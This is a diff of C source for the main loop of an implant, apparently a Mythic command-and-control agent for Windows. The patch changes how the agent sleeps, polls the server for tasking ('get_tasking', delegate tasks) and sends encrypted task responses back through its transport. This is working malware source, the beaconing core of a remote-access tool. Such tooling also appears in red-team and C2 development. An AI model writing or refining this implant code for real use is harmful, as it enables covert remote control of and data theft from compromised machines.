@@ -94,17 +94,13 @@ int s0_agent_run(const s0_config *cfg) {
         else
             s0_debug(L"checkin succeeded");
     }
-    responses.length = 0;
     checkin_len = wsprintfA(checkin,
         "{\"action\":\"get_tasking\",\"tasking_size\":-1,"
-        "\"get_delegate_tasks\":true,\"responses\":[]}");
+        "\"get_delegate_tasks\":true}");
     for (;;) {
         rx.length = plain.length = 0;
         Sleep(sleep_ms ? sleep_ms : 1000);
-        if (!s0_mythic_encode(callback_id, cfg->key,
-                              responses.length ? (const void *)responses.data
-                                               : (const void *)checkin,
-                              responses.length ? responses.length :
+        if (!s0_mythic_encode(callback_id, cfg->key, checkin,
                               (uint32_t)checkin_len, &tx)) break;
         if (!t.exchange(&t, tx.data, tx.length, &rx)) {
             s0_debug_error(L"poll exchange failed", GetLastError()); break;
@@ -118,13 +114,20 @@ int s0_agent_run(const s0_config *cfg) {
                                      &sleep_ms, &jitter_pct, &responses)) {
             s0_debug(L"task processing failed"); break;
         }
-        if (s0_mythic_task_exit_requested()) {
-            tx.length = rx.length = 0;
-            if (s0_mythic_encode(callback_id, cfg->key, responses.data,
-                                 responses.length, &tx))
-                t.exchange(&t, tx.data, tx.length, &rx);
-            break;
+        if (responses.length) {
+            tx.length = rx.length = plain.length = 0;
+            if (!s0_mythic_encode(callback_id, cfg->key, responses.data,
+                                  responses.length, &tx) ||
+                !t.exchange(&t, tx.data, tx.length, &rx)) {
+                s0_debug_error(L"response exchange failed", GetLastError());
+                break;
+            }
+            if (!s0_mythic_decode(cfg->key, rx.data, rx.length,
+                                  response_id, &plain)) {
+                s0_debug(L"response decode failed"); break;
+            }
         }
+        if (s0_mythic_task_exit_requested()) break;
     }
     t.close(&t); s0_buffer_free(&tx); s0_buffer_free(&rx);
     s0_buffer_free(&plain); s0_buffer_free(&responses);
